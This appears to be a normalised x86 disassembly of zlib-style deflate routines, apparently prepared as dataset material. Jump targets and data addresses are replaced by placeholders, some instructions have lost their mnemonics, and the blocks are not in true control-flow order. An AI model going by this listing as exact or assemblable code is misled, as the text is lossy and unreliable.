mov [ esp ] edx
mov esi eax
cmp [ esp ] 0x0
je r-xdata
mov eax 0xfffffffe
jmp r-xdata
test esi esi
je r-xdata
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax [ esp ]
cmp [ eax + 0x1c ] 0x0
jne r-xdata
mov edx [ esp ]
mov eax [ esp ]
mov ecx 0xe
mov edi [ edx + 0x1c ]
push esi
push edi
mov edi esi
mov esi eax
[ edi ] [ esi ]
pop edi
pop esi
mov ecx 0x16b8
mov edx 0x1
mov eax [ esi + 0x28 ]
call [ esi + 0x20 ]
mov ebx eax
test ebx ebx
jne r-xdata
mov [ esi + 0x1c ] ebx
push esi
push edi
mov esi edi
mov edi ebx
mov ecx 0x5ae
[ edi ] [ esi ]
pop edi
pop esi
mov [ ebx ] esi
mov ecx 0x2
mov edx [ ebx + 0x24 ]
mov eax [ esi + 0x28 ]
call [ esi + 0x20 ]
mov [ ebx + 0x30 ] eax
mov ecx 0x2
mov edx [ ebx + 0x24 ]
mov eax [ esi + 0x28 ]
call [ esi + 0x20 ]
mov [ ebx + 0x38 ] eax
mov ecx 0x2
mov edx [ ebx + 0x44 ]
mov eax [ esi + 0x28 ]
call [ esi + 0x20 ]
mov [ ebx + 0x3c ] eax
mov ecx 0x4
mov edx [ ebx + 0x1694 ]
mov eax [ esi + 0x28 ]
call [ esi + 0x20 ]
mov ebp eax
mov [ ebx + 0x8 ] ebp
cmp [ ebx + 0x30 ] 0x0
je r-xdata
mov eax 0xfffffffc
jmp r-xdata
mov eax esi
call sub_3ae5f10
mov eax 0xfffffffc
jmp r-xdata
cmp [ ebx + 0x38 ] 0x0
je r-xdata
cmp [ ebx + 0x3c ] 0x0
je r-xdata
cmp [ ebx + 0x8 ] 0x0
jne r-xdata
mov edx [ ebx + 0x24 ]
add edx edx
push edx
mov ecx [ edi + 0x30 ]
push ecx
mov eax [ ebx + 0x30 ]
push eax
call sub_3ae5438
add esp 0xc
mov edx [ ebx + 0x24 ]
add edx edx
push edx
mov ecx [ edi + 0x38 ]
push ecx
mov eax [ ebx + 0x38 ]
push eax
call sub_3ae5438
add esp 0xc
mov edx [ ebx + 0x44 ]
add edx edx
push edx
mov ecx [ edi + 0x3c ]
push ecx
mov eax [ ebx + 0x3c ]
push eax
call sub_3ae5438
add esp 0xc
mov edx [ ebx + 0xc ]
push edx
mov ecx [ edi + 0x8 ]
push ecx
mov eax [ ebx + 0x8 ]
push eax
call sub_3ae5438
mov edx [ edi + 0x10 ]
add esp 0xc
sub edx [ edi + 0x8 ]
add edx [ ebx + 0x8 ]
mov [ ebx + 0x10 ] edx
lea edx [ ebx + 0x8c ]
mov ecx [ ebx + 0x1694 ]
shr ecx 0x1
add ecx ecx
add ebp ecx
lea ecx [ ebx + 0x980 ]
mov [ ebx + 0x169c ] ebp
mov eax [ ebx + 0x1694 ]
lea eax [ eax + eax * 2 ]
add eax [ ebx + 0x8 ]
mov [ ebx + 0x1690 ] eax
mov [ ebx + 0xb10 ] edx
lea eax [ ebx + 0xa74 ]
mov [ ebx + 0xb1c ] ecx
mov [ ebx + 0xb28 ] eax
xor eax eax
sub_3ae6148
push ebx
push esi
mov esi eax
push edi
mov edi edx
mov ebx [ esi + 0x4 ]
cmp ecx ebx
jae r-xdata
test ebx ebx
jne r-xdata
mov ebx ecx
sub [ esi + 0x4 ] ebx
mov edx [ esi + 0x1c ]
cmp [ edx + 0x18 ] 0x0
jne r-xdata
xor eax eax
jmp r-xdata
push ebx
mov ecx [ esi ]
push ecx
push edi
call sub_3ae5438
add esp 0xc
mov eax ebx
add [ esi ] eax
add [ esi + 0x8 ] ebx
mov ecx ebx
mov edx [ esi ]
mov eax [ esi + 0x30 ]
call sub_3aeb5d4
mov [ esi + 0x30 ] eax
pop edi
pop esi
pop ebx
retn
sub_3ae6194
push ebx
mov ebx eax
mov eax [ ebx + 0x24 ]
add eax eax
mov [ ebx + 0x34 ] eax
mov edx [ ebx + 0x3c ]
mov ecx [ ebx + 0x44 ]
mov [ edx + ecx * 2 - 0x2 ] 0x0
mov eax [ ebx + 0x44 ]
dec eax
add eax eax
push eax
push 0x0
mov edx [ ebx + 0x3c ]
push edx
call sub_3ae5424
mov ecx [ ebx + 0x7c ]
add esp 0xc
lea ecx [ ecx + ecx * 2 ]
movzx eax [ ecx * 4 + rw-data ]
mov [ ebx + 0x78 ] eax
mov edx [ ebx + 0x7c ]
lea edx [ edx + edx * 2 ]
movzx ecx [ edx * 4 + rw-data ]
mov [ ebx + 0x84 ] ecx
mov eax [ ebx + 0x7c ]
lea eax [ eax + eax * 2 ]
movzx edx [ eax * 4 + rw-data ]
mov [ ebx + 0x88 ] edx
xor edx edx
mov ecx [ ebx + 0x7c ]
lea ecx [ ecx + ecx * 2 ]
movzx eax [ ecx * 4 + rw-data ]
mov [ ebx + 0x74 ] eax
mov [ ebx + 0x64 ] edx
xor ecx ecx
xor eax eax
mov [ ebx + 0x54 ] ecx
mov [ ebx + 0x6c ] eax
mov edx 0x2
xor eax eax
mov [ ebx + 0x70 ] edx
mov [ ebx + 0x58 ] edx
mov [ ebx + 0x60 ] eax
xor ecx ecx
mov [ ebx + 0x40 ] ecx
pop ebx
retn
sub_3ae6234
push ebx
push esi
push edi
add esp 0xffffffe4
mov [ esp ] edx
mov edx [ eax + 0x74 ]
mov [ esp + 0x4 ] edx
mov edx [ eax + 0x64 ]
mov ecx [ eax + 0x30 ]
mov edi [ eax + 0x70 ]
mov ebx [ eax + 0x88 ]
mov [ esp + 0x8 ] ebx
add ecx edx
mov ebx [ eax + 0x24 ]
sub ebx 0x106
cmp edx ebx
jbe r-xdata
xor ebx ebx
mov edx [ eax + 0x24 ]
sub edx 0x106
mov ebx [ eax + 0x64 ]
sub ebx edx
jmp r-xdata
mov ebx [ eax + 0x6c ]
cmp ebx [ esp + 0x8 ]
jae r-xdata
shr [ esp + 0x4 ] 0x2
mov [ esp + 0xc ] ebx
mov edx [ eax + 0x38 ]
mov [ esp + 0x10 ] edx
mov edx [ eax + 0x2c ]
mov [ esp + 0x14 ] edx
mov edx [ eax + 0x30 ]
mov bl [ ecx + edi - 0x1 ]
add edx [ eax + 0x64 ]
mov [ esp + 0x18 ] bl
mov bl [ ecx + edi ]
add edx 0x102
mov [ esp + 0x19 ] bl
mov ebx [ eax + 0x70 ]
cmp ebx [ eax + 0x84 ]
jb r-xdata
mov esi [ eax + 0x30 ]
add esi [ esp ]
mov bl [ esi + edi ]
cmp bl [ esp + 0x19 ]
jne r-xdata
mov [ esp + 0x8 ] ebx
mov ebx [ esp ]
and ebx [ esp + 0x14 ]
mov esi [ esp + 0x10 ]
movzx ebx [ esi + ebx * 2 ]
mov [ esp ] ebx
cmp ebx [ esp + 0xc ]
jbe r-xdata
mov bl [ esi + edi - 0x1 ]
cmp bl [ esp + 0x18 ]
jne r-xdata
mov edx [ eax + 0x6c ]
mov ecx edi
cmp edx ecx
jb r-xdata
dec [ esp + 0x4 ]
jne r-xdata
mov bl [ esi ]
cmp bl [ ecx ]
jne r-xdata
mov eax edx
mov eax ecx
jmp r-xdata
inc esi
mov bl [ esi ]
cmp bl [ ecx + 0x1 ]
jne r-xdata
add esp 0x1c
pop edi
pop esi
pop ebx
retn
add ecx 0x2
inc esi
mov ebx edx
sub ebx ecx
push ebx
mov ebx 0x102
pop ecx
sub ebx ecx
lea ecx [ edx - 0x102 ]
cmp edi ebx
jge r-xdata
inc ecx
inc esi
mov bl [ ecx ]
cmp bl [ esi ]
jne r-xdata
mov esi [ esp ]
mov [ eax + 0x68 ] esi
mov edi ebx
cmp ebx [ esp + 0x8 ]
jge r-xdata
inc ecx
inc esi
mov bl [ ecx ]
cmp bl [ esi ]
jne r-xdata
mov bl [ ecx + edi - 0x1 ]
mov [ esp + 0x18 ] bl
mov bl [ ecx + edi ]
mov [ esp + 0x19 ] bl
inc ecx
inc esi
mov bl [ ecx ]
cmp bl [ esi ]
jne r-xdata
inc ecx
inc esi
mov bl [ ecx ]
cmp bl [ esi ]
jne r-xdata
inc ecx
inc esi
mov bl [ ecx ]
cmp bl [ esi ]
jne r-xdata
inc ecx
inc esi
mov bl [ ecx ]
cmp bl [ esi ]
jne r-xdata
inc ecx
inc esi
mov bl [ ecx ]
cmp bl [ esi ]
jne r-xdata
cmp edx ecx
ja r-xdata
inc ecx
inc esi
mov bl [ ecx ]
cmp bl [ esi ]
jne r-xdata
sub_3ae63ac
push ebx
push esi
push edi
mov ebx eax
push ebp
push ecx
mov esi [ ebx + 0x24 ]
cmp edi 0xffffffff
jne r-xdata
cmp [ ebx + 0x64 ] 0x0
jne r-xdata
mov eax [ ebx + 0x24 ]
sub eax 0x106
add eax esi
cmp eax [ ebx + 0x64 ]
ja r-xdata
dec edi
jmp r-xdata
cmp [ ebx + 0x6c ] 0x0
jne r-xdata
mov ebp [ ebx ]
cmp [ ebp + 0x4 ] 0x0
je r-xdata
push esi
mov eax [ ebx + 0x30 ]
mov edx eax
mov ebp esi
add edx ebp
push edx
push eax
call sub_3ae5438
add esp 0xc
sub [ ebx + 0x68 ] esi
sub [ ebx + 0x64 ] esi
sub [ ebx + 0x54 ] ebp
mov eax [ ebx + 0x44 ]
mov edx eax
add edx edx
add edx [ ebx + 0x3c ]
mov edi esi
jmp r-xdata
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov edx [ ebx + 0x30 ]
mov ecx edi
add edx [ ebx + 0x64 ]
mov eax ebp
add edx [ ebx + 0x6c ]
call sub_3ae6148
add [ ebx + 0x6c ] eax
cmp [ ebx + 0x6c ] 0x3
jb r-xdata
xor ecx ecx
mov cx [ esp ]
sub cx si
jmp r-xdata
cmp [ ebx + 0x6c ] 0x106
jae r-xdata
mov eax [ ebx + 0x30 ]
mov edx [ ebx + 0x64 ]
movzx eax [ eax + edx ]
mov [ ebx + 0x40 ] eax
mov ecx [ ebx + 0x50 ]
shl eax cl
mov edx [ ebx + 0x30 ]
mov ecx [ ebx + 0x64 ]
movzx edx [ edx + ecx + 0x1 ]
xor eax edx
and eax [ ebx + 0x4c ]
mov [ ebx + 0x40 ] eax
sub edx 0x2
movzx ecx [ edx ]
mov [ esp ] ecx
cmp esi [ esp ]
ja r-xdata
mov eax esi
mov edx eax
add edx edx
add edx [ ebx + 0x38 ]
mov [ edx ] cx
dec eax
jne r-xdata
mov eax [ ebx ]
cmp [ eax + 0x4 ] 0x0
jne r-xdata
xor ecx ecx
mov cx [ esp ]
sub cx si
jmp r-xdata
mov edi [ ebx + 0x34 ]
sub edi [ ebx + 0x6c ]
sub edi [ ebx + 0x64 ]
test edi edi
jne r-xdata
sub edx 0x2
movzx ecx [ edx ]
mov [ esp ] ecx
cmp esi [ esp ]
ja r-xdata
add edi esi
mov [ edx ] cx
dec eax
jne r-xdata
sub_3ae64c0
push ebx
mov ebx eax
push esi
push ecx
mov [ esp ] edx
mov esi 0xffff
mov eax [ ebx + 0xc ]
sub eax 0x5
cmp esi eax
jbe r-xdata
cmp [ ebx + 0x6c ] 0x1
ja r-xdata
mov esi eax
mov edx [ ebx + 0x6c ]
xor ecx ecx
add [ ebx + 0x64 ] edx
mov [ ebx + 0x6c ] ecx
mov eax [ ebx + 0x54 ]
mov edx [ ebx + 0x64 ]
add eax esi
test edx edx
je r-xdata
mov eax ebx
call sub_3ae63ac
mov eax [ ebx + 0x6c ]
test eax eax
jne r-xdata
sub edx eax
mov [ ebx + 0x6c ] edx
mov [ ebx + 0x64 ] eax
push 0x0
mov ecx [ ebx + 0x64 ]
sub ecx [ ebx + 0x54 ]
cmp [ ebx + 0x54 ] 0x0
jl r-xdata
cmp eax edx
ja r-xdata
test eax eax
je r-xdata
cmp [ esp ] 0x0
jne r-xdata
xor edx edx
mov edx [ ebx + 0x30 ]
add edx [ ebx + 0x54 ]
jmp r-xdata
mov edx [ ebx + 0x64 ]
mov eax [ ebx + 0x54 ]
sub edx eax
mov ecx [ ebx + 0x24 ]
sub ecx 0x106
cmp edx ecx
jb r-xdata
cmp [ esp ] 0x4
sete dl
and edx 0x1
push edx
mov ecx [ ebx + 0x64 ]
sub ecx [ ebx + 0x54 ]
cmp [ ebx + 0x54 ] 0x0
jl r-xdata
xor eax eax
jmp r-xdata
xor eax eax
jmp r-xdata
mov eax ebx
call sub_3aeac44
mov ecx [ ebx + 0x64 ]
mov [ ebx + 0x54 ] ecx
mov eax [ ebx ]
call sub_3ae5c38
mov edx [ ebx ]
cmp [ edx + 0x10 ] 0x0
jne r-xdata
push 0x0
mov ecx [ ebx + 0x64 ]
sub ecx [ ebx + 0x54 ]
test eax eax
jl r-xdata
xor edx edx
mov edx [ ebx + 0x30 ]
add edx [ ebx + 0x54 ]
jmp r-xdata
pop edx
pop esi
pop ebx
retn
xor edx edx
mov edx [ ebx + 0x30 ]
add edx [ ebx + 0x54 ]
jmp r-xdata
cmp [ esp ] 0x4
jne r-xdata
cmp [ esp ] 0x4
jne r-xdata
mov eax ebx
call sub_3aeac44
mov ecx [ ebx + 0x64 ]
mov [ ebx + 0x54 ] ecx
mov eax [ ebx ]
call sub_3ae5c38
mov edx [ ebx ]
cmp [ edx + 0x10 ] 0x0
jne r-xdata
xor eax eax
jmp r-xdata
mov eax ebx
call sub_3aeac44
mov ecx [ ebx + 0x64 ]
mov [ ebx + 0x54 ] ecx
mov eax [ ebx ]
call sub_3ae5c38
mov edx [ ebx ]
cmp [ edx + 0x10 ] 0x0
jne r-xdata
mov eax 0x1
mov eax 0x3
jmp r-xdata
xor eax eax
jmp r-xdata
mov eax 0x2
jmp r-xdata
sub_3ae6820
add [ eax ] al
cmp [ ebx + 0x6c ] 0x106
jae r-xdata
push 0x0
mov ecx [ ebx + 0x64 ]
sub ecx [ ebx + 0x54 ]
cmp [ ebx + 0x54 ] 0x0
jl r-xdata
cmp [ ebx + 0x6c ] 0x3
jb r-xdata
mov eax ebx
call sub_3ae63ac
mov eax [ ebx + 0x6c ]
cmp eax 0x106
jae r-xdata
xor edx edx
mov edx [ ebx + 0x30 ]
add edx [ ebx + 0x54 ]
jmp r-xdata
test esi esi
je r-xdata
mov ecx [ ebx + 0x50 ]
mov eax [ ebx + 0x40 ]
shl eax cl
mov edx [ ebx + 0x30 ]
mov ecx [ ebx + 0x64 ]
movzx edx [ edx + ecx + 0x2 ]
xor eax edx
and eax [ ebx + 0x4c ]
mov [ ebx + 0x40 ] eax
mov ecx [ ebx + 0x3c ]
movzx esi [ ecx + eax * 2 ]
mov eax [ ebx + 0x64 ]
and eax [ ebx + 0x2c ]
mov edx [ ebx + 0x38 ]
mov [ edx + eax * 2 ] si
mov ecx [ ebx + 0x3c ]
mov eax [ ebx + 0x40 ]
mov dx [ ebx + 0x64 ]
mov [ ecx + eax * 2 ] dx
test eax eax
je r-xdata
cmp [ esp ] 0x0
jne r-xdata
xor eax eax
jmp r-xdata
mov eax ebx
call sub_3aeac44
mov ecx [ ebx + 0x64 ]
mov [ ebx + 0x54 ] ecx
mov eax [ ebx ]
call sub_3ae5c38
mov edx [ ebx ]
cmp [ edx + 0x10 ] 0x0
jne r-xdata
cmp [ ebx + 0x58 ] 0x3
jb r-xdata
mov ecx [ ebx + 0x64 ]
mov eax [ ebx + 0x24 ]
sub eax 0x106
sub ecx esi
cmp ecx eax
ja r-xdata
cmp [ esp ] 0x4
sete dl
and edx 0x1
push edx
mov ecx [ ebx + 0x64 ]
sub ecx [ ebx + 0x54 ]
cmp [ ebx + 0x54 ] 0x0
jl r-xdata
xor eax eax
jmp r-xdata
pop edx
pop edi
pop esi
pop ebx
retn
mov eax [ ebx + 0x1694 ]
dec eax
cmp eax [ ebx + 0x1698 ]
sete al
and eax 0x1
dec [ ebx + 0x6c ]
inc [ ebx + 0x64 ]
mov eax [ ebx + 0x30 ]
mov edx [ ebx + 0x64 ]
mov al [ eax + edx ]
mov edx [ ebx + 0x169c ]
mov ecx [ ebx + 0x1698 ]
mov [ edx + ecx * 2 ] 0x0
mov edx [ ebx + 0x1698 ]
inc [ ebx + 0x1698 ]
mov ecx [ ebx + 0x1690 ]
mov [ ecx + edx ] al
and eax 0xff
inc [ ebx + eax * 4 + 0x8c ]
mov ax [ ebx + 0x64 ]
mov ecx [ ebx + 0x169c ]
sub ax [ ebx + 0x68 ]
mov edi [ ebx + 0x1698 ]
mov dl [ ebx + 0x58 ]
mov [ ecx + edi * 2 ] ax
sub dl 0x3
mov ecx [ ebx + 0x1698 ]
dec eax
inc [ ebx + 0x1698 ]
mov edi [ ebx + 0x1690 ]
mov [ edi + ecx ] dl
and edx 0xff
xor ecx ecx
mov cl [ edx + rw-data ]
inc [ ebx + ecx * 4 + 0x490 ]
cmp ax 0x100
jae r-xdata
cmp [ ebx + 0x80 ] 0x2
je r-xdata
xor edx edx
mov edx [ ebx + 0x30 ]
add edx [ ebx + 0x54 ]
jmp r-xdata
movzx eax ax
sar eax 0x7
mov cl [ eax + rw-data ]
movzx edx ax
mov cl [ edx + rw-data ]
jmp r-xdata
mov edx esi
mov eax ebx
call sub_3ae6234
mov [ ebx + 0x58 ] eax
cmp [ esp ] 0x4
jne r-xdata
cmp [ esp ] 0x4
jne r-xdata
mov eax ebx
call sub_3aeac44
mov ecx [ ebx + 0x64 ]
mov [ ebx + 0x54 ] ecx
mov eax [ ebx ]
call sub_3ae5c38
mov edx [ ebx ]
cmp [ edx + 0x10 ] 0x0
jne r-xdata
mov edx [ ebx + 0x58 ]
xor ecx ecx
add [ ebx + 0x64 ] edx
mov [ ebx + 0x58 ] ecx
mov ecx [ ebx + 0x64 ]
mov edx [ ebx + 0x30 ]
movzx edx [ edx + ecx ]
mov [ ebx + 0x40 ] edx
mov ecx [ ebx + 0x50 ]
mov edi [ ebx + 0x64 ]
shl edx cl
mov ecx [ ebx + 0x30 ]
movzx ecx [ ecx + edi + 0x1 ]
xor edx ecx
and edx [ ebx + 0x4c ]
mov [ ebx + 0x40 ] edx
jmp r-xdata
cmp [ ebx + 0x6c ] 0x3
jb r-xdata
xor eax eax
mov al cl
inc [ ebx + eax * 4 + 0x980 ]
mov edx [ ebx + 0x1694 ]
dec edx
cmp edx [ ebx + 0x1698 ]
sete al
and eax 0x1
mov edx [ ebx + 0x58 ]
sub [ ebx + 0x6c ] edx
mov ecx [ ebx + 0x58 ]
cmp ecx [ ebx + 0x78 ]
ja r-xdata
mov eax 0x1
mov eax 0x3
jmp r-xdata
xor eax eax
jmp r-xdata
mov eax 0x2
jmp r-xdata
test eax eax
je r-xdata
dec [ ebx + 0x58 ]
inc [ ebx + 0x64 ]
mov ecx [ ebx + 0x50 ]
mov edx [ ebx + 0x40 ]
shl edx cl
mov ecx [ ebx + 0x30 ]
mov esi [ ebx + 0x64 ]
movzx ecx [ ecx + esi + 0x2 ]
xor edx ecx
and edx [ ebx + 0x4c ]
mov [ ebx + 0x40 ] edx
mov ecx [ ebx + 0x3c ]
movzx esi [ ecx + edx * 2 ]
mov edx [ ebx + 0x64 ]
and edx [ ebx + 0x2c ]
mov ecx [ ebx + 0x38 ]
mov [ ecx + edx * 2 ] si
mov edx [ ebx + 0x3c ]
mov ecx [ ebx + 0x40 ]
mov di [ ebx + 0x64 ]
mov [ edx + ecx * 2 ] di
dec [ ebx + 0x58 ]
jne r-xdata
inc [ ebx + 0x64 ]
jmp r-xdata
sub_3ae6aa8
push ebx
dec esp
inc [ ebx + 0x64 ]
mov ecx [ ebx + 0x64 ]
cmp ecx [ esp + 0x4 ]
ja r-xdata
xor edx edx
mov [ ebx + 0x60 ] edx
mov [ ebx + 0x58 ] 0x2
inc [ ebx + 0x64 ]
test eax eax
je r-xdata
dec [ ebx + 0x70 ]
jne r-xdata
mov [ ebx + 0x40 ] edx
mov edx [ ebx + 0x3c ]
mov ecx [ ebx + 0x40 ]
movzx esi [ edx + ecx * 2 ]
mov edx [ ebx + 0x64 ]
and edx [ ebx + 0x2c ]
mov ecx [ ebx + 0x38 ]
mov [ ecx + edx * 2 ] si
mov edx [ ebx + 0x3c ]
mov ecx [ ebx + 0x40 ]
mov di [ ebx + 0x64 ]
mov [ edx + ecx * 2 ] di
mov ecx [ ebx + 0x50 ]
mov edx [ ebx + 0x40 ]
shl edx cl
mov ecx [ ebx + 0x30 ]
mov esi [ ebx + 0x64 ]
movzx ecx [ ecx + esi + 0x2 ]
xor edx ecx
and edx [ ebx + 0x4c ]
cmp [ ebx + 0x6c ] 0x106
jae r-xdata
push 0x0
mov ecx [ ebx + 0x64 ]
sub ecx [ ebx + 0x54 ]
cmp [ ebx + 0x54 ] 0x0
jl r-xdata
cmp [ ebx + 0x6c ] 0x3
jb r-xdata
mov eax ebx
call sub_3ae63ac
mov eax [ ebx + 0x6c ]
cmp eax 0x106
jae r-xdata
xor edx edx
mov edx [ ebx + 0x30 ]
add edx [ ebx + 0x54 ]
jmp r-xdata
mov ecx [ ebx + 0x58 ]
mov [ ebx + 0x70 ] ecx
mov eax [ ebx + 0x68 ]
mov [ ebx + 0x5c ] eax
mov [ ebx + 0x58 ] 0x2
test esi esi
je r-xdata
mov ecx [ ebx + 0x50 ]
mov eax [ ebx + 0x40 ]
shl eax cl
mov edx [ ebx + 0x30 ]
mov ecx [ ebx + 0x64 ]
movzx edx [ edx + ecx + 0x2 ]
xor eax edx
and eax [ ebx + 0x4c ]
mov [ ebx + 0x40 ] eax
mov ecx [ ebx + 0x3c ]
movzx esi [ ecx + eax * 2 ]
mov eax [ ebx + 0x64 ]
and eax [ ebx + 0x2c ]
mov edx [ ebx + 0x38 ]
mov [ edx + eax * 2 ] si
mov ecx [ ebx + 0x3c ]
mov eax [ ebx + 0x40 ]
mov dx [ ebx + 0x64 ]
mov [ ecx + eax * 2 ] dx
test eax eax
je r-xdata
cmp [ esp ] 0x0
jne r-xdata
xor eax eax
jmp r-xdata
mov eax ebx
call sub_3aeac44
mov ecx [ ebx + 0x64 ]
mov [ ebx + 0x54 ] ecx
mov eax [ ebx ]
call sub_3ae5c38
mov edx [ ebx ]
cmp [ edx + 0x10 ] 0x0
jne r-xdata
mov eax [ ebx + 0x70 ]
cmp eax 0x3
jb r-xdata
mov edx [ ebx + 0x70 ]
cmp edx [ ebx + 0x78 ]
jae r-xdata
cmp [ ebx + 0x60 ] 0x0
je r-xdata
xor eax eax
jmp r-xdata
pop ecx
pop edx
pop edi
pop esi
pop ebx
retn
cmp [ ebx + 0x60 ] 0x0
je r-xdata
cmp eax [ ebx + 0x58 ]
jb r-xdata
mov ecx [ ebx + 0x64 ]
mov eax [ ebx + 0x24 ]
sub eax 0x106
sub ecx esi
cmp ecx eax
ja r-xdata
cmp [ esp ] 0x4
sete al
and eax 0x1
push eax
mov ecx [ ebx + 0x64 ]
sub ecx [ ebx + 0x54 ]
cmp [ ebx + 0x54 ] 0x0
jl r-xdata
mov edx [ ebx + 0x30 ]
mov ecx [ ebx + 0x64 ]
mov al [ edx + ecx - 0x1 ]
mov edx [ ebx + 0x169c ]
mov ecx [ ebx + 0x1698 ]
mov [ edx + ecx * 2 ] 0x0
mov edx [ ebx + 0x1698 ]
inc [ ebx + 0x1698 ]
mov ecx [ ebx + 0x1690 ]
mov [ ecx + edx ] al
and eax 0xff
inc [ ebx + eax * 4 + 0x8c ]
mov eax [ ebx + 0x1694 ]
dec eax
cmp eax [ ebx + 0x1698 ]
sete dl
and edx 0x1
xor ecx ecx
mov [ ebx + 0x60 ] ecx
mov [ ebx + 0x60 ] 0x1
inc [ ebx + 0x64 ]
dec [ ebx + 0x6c ]
jmp r-xdata
mov edx [ ebx + 0x30 ]
mov ecx [ ebx + 0x64 ]
mov al [ edx + ecx - 0x1 ]
mov edx [ ebx + 0x169c ]
mov ecx [ ebx + 0x1698 ]
mov [ edx + ecx * 2 ] 0x0
mov edx [ ebx + 0x1698 ]
inc [ ebx + 0x1698 ]
mov ecx [ ebx + 0x1690 ]
mov [ ecx + edx ] al
and eax 0xff
inc [ ebx + eax * 4 + 0x8c ]
mov eax [ ebx + 0x1694 ]
dec eax
cmp eax [ ebx + 0x1698 ]
sete al
and eax 0x1
test eax eax
je r-xdata
mov edx [ ebx + 0x64 ]
add edx [ ebx + 0x6c ]
sub edx 0x3
mov [ esp + 0x4 ] edx
mov ax [ ebx + 0x64 ]
mov ecx [ ebx + 0x169c ]
dec eax
mov edi [ ebx + 0x1698 ]
sub ax [ ebx + 0x5c ]
mov dl [ ebx + 0x70 ]
mov [ ecx + edi * 2 ] ax
sub dl 0x3
mov ecx [ ebx + 0x1698 ]
dec eax
inc [ ebx + 0x1698 ]
mov edi [ ebx + 0x1690 ]
mov [ edi + ecx ] dl
and edx 0xff
xor ecx ecx
mov cl [ edx + rw-data ]
inc [ ebx + ecx * 4 + 0x490 ]
cmp ax 0x100
jae r-xdata
cmp [ ebx + 0x80 ] 0x2
je r-xdata
xor edx edx
mov edx [ ebx + 0x30 ]
add edx [ ebx + 0x54 ]
jmp r-xdata
inc [ ebx + 0x64 ]
dec [ ebx + 0x6c ]
mov edx [ ebx ]
cmp [ edx + 0x10 ] 0x0
jne r-xdata
push 0x0
mov ecx [ ebx + 0x64 ]
sub ecx [ ebx + 0x54 ]
cmp [ ebx + 0x54 ] 0x0
jl r-xdata
movzx eax ax
sar eax 0x7
mov cl [ eax + rw-data ]
movzx edx ax
mov cl [ edx + rw-data ]
jmp r-xdata
cmp [ ebx + 0x58 ] 0x5
ja r-xdata
mov edx esi
mov eax ebx
call sub_3ae6234
mov [ ebx + 0x58 ] eax
cmp [ esp ] 0x4
jne r-xdata
cmp [ esp ] 0x4
jne r-xdata
mov eax ebx
call sub_3aeac44
mov ecx [ ebx + 0x64 ]
mov [ ebx + 0x54 ] ecx
mov eax [ ebx ]
call sub_3ae5c38
mov edx [ ebx ]
cmp [ edx + 0x10 ] 0x0
jne r-xdata
xor eax eax
jmp r-xdata
xor edx edx
mov edx [ ebx + 0x30 ]
add edx [ ebx + 0x54 ]
jmp r-xdata
xor eax eax
mov al cl
inc [ ebx + eax * 4 + 0x980 ]
mov edx [ ebx + 0x1694 ]
dec edx
cmp edx [ ebx + 0x1698 ]
sete al
and eax 0x1
mov edx [ ebx + 0x70 ]
dec edx
sub [ ebx + 0x6c ] edx
sub [ ebx + 0x70 ] 0x2
cmp [ ebx + 0x80 ] 0x1
je r-xdata
mov eax 0x1
mov eax 0x3
jmp r-xdata
xor eax eax
jmp r-xdata
mov eax 0x2
jmp r-xdata
mov eax ebx
call sub_3aeac44
mov ecx [ ebx + 0x64 ]
mov [ ebx + 0x54 ] ecx
mov eax [ ebx ]
call sub_3ae5c38
mov [ ebx + 0x58 ] 0x2
cmp [ ebx + 0x58 ] 0x3
jne r-xdata
mov edx [ ebx + 0x64 ]
sub edx [ ebx + 0x68 ]
cmp edx 0x1000
jbe r-xdata
sub_3ae6cac
test eax eax
je r-xdata
mov eax 0xfffffffe
retn
cmp [ eax + 0x1c ] 0x0
jne r-xdata
xor edx edx
xor ecx ecx
mov [ eax + 0x14 ] edx
mov [ eax + 0x8 ] edx
mov [ eax + 0x18 ] ecx
mov ecx [ eax + 0x1c ]
cmp [ ecx + 0xc ] 0x0
je r-xdata
xor ecx ecx
mov ecx 0x7
jmp r-xdata
mov edx [ eax + 0x1c ]
mov [ edx ] ecx
mov edx [ edx + 0x14 ]
xor ecx ecx
xchg edx eax
call sub_3ae737c
xor eax eax
retn
sub_3ae6cf0
push ebx
mov ebx eax
test ebx ebx
je r-xdata
mov eax 0xfffffffe
pop ebx
retn
cmp [ ebx + 0x1c ] 0x0
je r-xdata
cmp [ ebx + 0x24 ] 0x0
jne r-xdata
mov edx [ ebx + 0x1c ]
mov eax [ edx + 0x14 ]
test eax eax
je r-xdata
mov edx [ ebx + 0x1c ]
mov eax [ ebx + 0x28 ]
call [ ebx + 0x24 ]
xor ecx ecx
xor eax eax
mov [ ebx + 0x1c ] ecx
pop ebx
retn
mov edx ebx
call sub_3ae8150
sub_3ae6d30
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov esi edx
cmp [ ebp - 0x4 ] 0x0
mov ebx eax
je r-xdata
mov eax 0xfffffffa
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov dl [ eax ]
cmp dl [ rw-data ]
jne r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x4
cmp [ ebp + 0x8 ] 0x38
je r-xdata
test ebx ebx
jne r-xdata
xor edx edx
mov [ ebx + 0x18 ] edx
cmp [ ebx + 0x20 ] 0x0
jne r-xdata
mov eax 0xfffffffe
jmp r-xdata
cmp [ ebx + 0x24 ] 0x0
jne r-xdata
mov [ ebx + 0x20 ] r-xdata
xor ecx ecx
mov [ ebx + 0x28 ] ecx
mov ecx 0x18
mov edx 0x1
mov eax [ ebx + 0x28 ]
call [ ebx + 0x20 ]
mov [ ebx + 0x1c ] eax
test eax eax
jne r-xdata
mov [ ebx + 0x24 ] sub_3ae541c
mov edx [ ebx + 0x1c ]
xor ecx ecx
mov [ edx + 0x14 ] ecx
xor edx edx
mov eax [ ebx + 0x1c ]
test esi esi
mov [ eax + 0xc ] edx
jge r-xdata
mov eax 0xfffffffc
jmp r-xdata
cmp esi 0x8
jl r-xdata
mov ecx [ ebx + 0x1c ]
neg esi
mov [ ecx + 0xc ] 0x1
mov eax ebx
call sub_3ae6cf0
mov eax 0xfffffffe
jmp r-xdata
cmp esi 0xf
jle r-xdata
mov ecx esi
mov eax 0x1
shl eax cl
mov edi [ ebx + 0x1c ]
mov ecx eax
mov [ edi + 0x10 ] esi
cmp [ edi + 0xc ] 0x0
je r-xdata
mov edx sub_3aeb5d4
xor edx edx
jmp r-xdata
mov eax ebx
call sub_3ae6cac
xor eax eax
mov eax ebx
call sub_3ae6cf0
mov eax 0xfffffffc
jmp r-xdata
mov eax ebx
